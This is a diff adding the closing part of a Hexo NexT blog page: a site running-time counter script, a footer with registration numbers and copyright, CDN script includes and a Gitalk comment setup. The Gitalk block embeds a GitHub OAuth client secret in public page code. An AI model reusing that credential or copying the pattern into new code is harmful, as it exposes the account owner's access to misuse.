+    var starttime = "2017-05-20 16:46:00";
+    setInterval(function () { interval(starttime); }, 1000);
+    function interval(e) {
+        var date1 = new Date(e);  //开始时间
+        var date2 = new Date();    //结束时间
+        var date3 = date2.getTime() - date1.getTime()  //时间差的毫秒数
+
+        //计算出相差天数
+        var days = Math.floor(date3 / (24 * 3600 * 1000))
+
+        //计算出小时数
+        var leave1 = date3 % (24 * 3600 * 1000)    //计算天数后剩余的毫秒数
+        var hours = Math.floor(leave1 / (3600 * 1000))
+        hours = hours > 9 ? hours : '0' + hours
+
+        //计算相差分钟数
+        var leave2 = leave1 % (3600 * 1000)        //计算小时数后剩余的毫秒数
+        var minutes = Math.floor(leave2 / (60 * 1000))
+        minutes = minutes > 9 ? minutes : '0' + minutes
+
+        //计算相差秒数
+        var leave3 = leave2 % (60 * 1000)      //计算分钟数后剩余的毫秒数
+        var seconds = Math.round(leave3 / 1000)
+        seconds = seconds > 9 ? seconds : '0' + seconds
+
+        var countDays = document.getElementById("site_time_ing")
+        countDays.innerHTML = days + "天 " + hours + "小时 " + minutes + "分钟 " + seconds + " 秒"
+    }
+  </script>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="BbeiAn-info">
+    <a target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" rel="nofollow" >鄂ICP备17012779号-1</a> 
+	  <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42011602000374" style="text-decoration:none;padding-left:25px;background:url(/images/beian.png) no-repeat left center" rel="nofollow">公安备案号 42011602000374</a>
+</div>
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="bug"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mr.Guan</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">20:58</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'd388b62cad048f1f754c',
+      clientSecret: '66257510e8644b4d04f8b5a5359e35688e1ea214',
+      repo        : 'xguan2014.github.io',
+      owner       : 'xguan2014',
+      admin       : ['xguan2014'],
+      id          : 'ea1cff696df4895db42aea2c07efb846',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
